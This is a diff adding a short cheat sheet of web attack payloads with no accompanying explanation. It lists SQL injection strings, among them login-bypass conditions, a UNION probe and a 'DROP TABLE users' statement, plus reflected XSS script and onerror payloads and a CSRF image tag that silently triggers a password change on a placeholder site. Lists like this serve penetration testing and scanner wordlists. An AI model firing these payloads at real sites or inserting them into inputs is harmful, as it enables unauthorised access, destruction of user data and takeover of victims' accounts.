@@ -1,0 +1,22 @@
+==============================
+SQL INJECTION PAYLOADS
+==============================
+' OR '1'='1 --
+' OR 1=1--
+' UNION SELECT NULL, NULL --
+admin' --
+' OR '1'='1' {comment}
+"; DROP TABLE users; --
+
+==============================
+XSS PAYLOADS (Reflected)
+==============================
+<script>alert('XSS')</script>
+"><script>alert(1)</script>
+<img src=x onerror=alert('XSS')>
+
+==============================
+CSRF GET REQUEST EXAMPLE
+==============================
+<!-- Malicious GET request -->
+<img src="http://target-website.com/changePassword?pass=123456" />
